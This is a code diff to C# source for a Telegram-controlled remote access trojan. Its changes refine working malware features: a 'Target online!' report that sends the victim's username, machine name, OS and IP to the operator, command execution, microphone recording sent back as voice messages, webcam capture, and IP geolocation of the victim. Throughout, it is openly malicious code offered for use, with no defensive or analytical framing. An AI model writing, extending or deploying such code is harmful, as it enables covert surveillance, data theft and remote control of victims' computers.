@@ -58,7 +58,7 @@ namespace TelegramRAT
             PythonEngine = Python.CreateEngine();
             PythonScope = PythonRuntime.CreateScope();
 
-            InitializeCommands(Commands);
+            //InitializeCommands(Commands);
             try
             {
                 Run();
@@ -77,7 +77,7 @@ namespace TelegramRAT
                 Commands.Clear();
                 Main(args);
             }
-            Console.WriteLine("adfhskldh");
+
         }
 
         static async void ReportError(Message message, Exception exception)
@@ -91,14 +91,15 @@ namespace TelegramRAT
 
         static void Run()
         {
-            Message hellomsg = Bot.SendTextMessageAsync(OwnerId,
+            var targetOnlineMessageTask = Bot.SendTextMessageAsync(OwnerId,
                 $"Target online! \n\n" +
 
                 $"Username: <b>{Environment.UserName}</b>\n" +
                 $"PC name: <b>{Environment.MachineName}</b>\n" +
                 $"OS: {Utils.GetWindowsVersion()}\n\n" +
-                $"IP: {Utils.GetIpAddress().Result}",
-                ParseMode.Html).Result;
+                $"IP: {Utils.GetIpAddressAsync().Result}",
+                ParseMode.Html);
+            var initCommandsTask = Task.Run(() => InitializeCommands(Commands));
 
             int offset = 0;
 
@@ -110,9 +111,9 @@ namespace TelegramRAT
 
                 updates = updates.Where(update =>
                 {
-                    return update.Message != null && update.Message.Date > hellomsg.Date;
+                    return update.Message != null && update.Message.Date > targetOnlineMessageTask.Result.Date;
                 }).ToArray();
-
+                initCommandsTask.Wait();
                 _ = UpdateWorker(updates);
 
                 Task.Delay(PollingDelay).Wait();
@@ -280,7 +281,7 @@ namespace TelegramRAT
                         cmd.StartInfo.UseShellExecute = false;
 
                         cmd.Start();
-                        await Bot.SendTextMessageAsync(model.Message.Chat.Id, "Started!", replyToMessageId: model.Message.MessageId);
+                        _ = Bot.SendTextMessageAsync(model.Message.Chat.Id, "Started!", replyToMessageId: model.Message.MessageId);
                         cmd.WaitForExit(1000);
                         //cmd.Kill(true);
 
@@ -723,6 +724,7 @@ namespace TelegramRAT
                             if (captureDevices.Count == 0)
                             {
                                 Bot.SendTextMessageAsync(model.Message.Chat.Id, "This pc has no webcamera.", replyToMessageId: model.Message.MessageId);
+                                return;
                             }
 
                             VideoCaptureDevice device = new VideoCaptureDevice(captureDevices[0].MonikerString);
@@ -766,8 +768,11 @@ namespace TelegramRAT
 
                     try
                     {
-                        _ = WinAPI.ShowMessageBoxAsync(model.RawArgs, "Message", WinAPI.MsgBoxFlag.MB_APPLMODAL | WinAPI.MsgBoxFlag.MB_ICONINFORMATION);
-                        await Bot.SendTextMessageAsync(model.Message.Chat.Id, "Sended!", replyToMessageId: model.Message.MessageId);
+                        var ShowMessageBoxResult = WinAPI.ShowMessageBoxAsync(model.RawArgs, "Message", WinAPI.MsgBoxFlag.MB_APPLMODAL | WinAPI.MsgBoxFlag.MB_ICONINFORMATION);
+                        _ = Bot.SendTextMessageAsync(model.Message.Chat.Id, "Sended!", replyToMessageId: model.Message.MessageId);
+                        ShowMessageBoxResult.Wait();
+                        await Bot.SendTextMessageAsync(model.Message.Chat.Id, "Message box closed", replyToMessageId: model.Message.MessageId);
+
                     }
                     catch (Exception ex)
                     {
@@ -1361,7 +1366,6 @@ namespace TelegramRAT
                             ReportError(model.Message, ex);
                         }
                     });
-                    Console.WriteLine("aboba");
                 }
             });
 
@@ -1409,14 +1413,14 @@ namespace TelegramRAT
 
                             waveIn2.StartRecording();
                             Bot.SendTextMessageAsync(model.Message.Chat.Id, "Start recording", replyToMessageId: model.Message.MessageId);
-
+                            Bot.SendChatActionAsync(model.Message.Chat.Id, ChatAction.RecordVoice);
                             Task.Delay((int)recordLength * 1000).Wait();
 
                             waveIn2.StopRecording();
 
                             memstrm.Position = 0;
 
-                            Bot.SendAudioAsync(model.Message.Chat.Id, new InputOnlineFile(memstrm, fileName: "record"), replyToMessageId: model.Message.MessageId).Wait();
+                            Bot.SendVoiceAsync(model.Message.Chat.Id, new InputOnlineFile(memstrm, fileName: "record"), replyToMessageId: model.Message.MessageId).Wait();
 
                             waveIn2.Dispose();
                             memstrm.Close();
@@ -1793,6 +1797,7 @@ namespace TelegramRAT
             CommandsList.Add(new BotCommand
             {
                 Command = "repeat",
+                Aliases = new string[] { "rr", "rpt" },
 
                 Description = "Repeat command by replying to a message",
                 ArgsCount = 0,
@@ -1908,7 +1913,7 @@ namespace TelegramRAT
                 ArgsCount = 0,
                 Execute = async model =>
                 {
-                    string ipAddress = await Utils.GetIpAddress();
+                    var ipAddress = await Utils.GetIpAddressAsync();
                     HttpClient httpClient = new HttpClient();
                     string ipApiResponse = await httpClient.GetStringAsync("http://ip-api.com/xml/" + ipAddress);
                     System.Xml.XmlDocument xmlDocument = new System.Xml.XmlDocument();
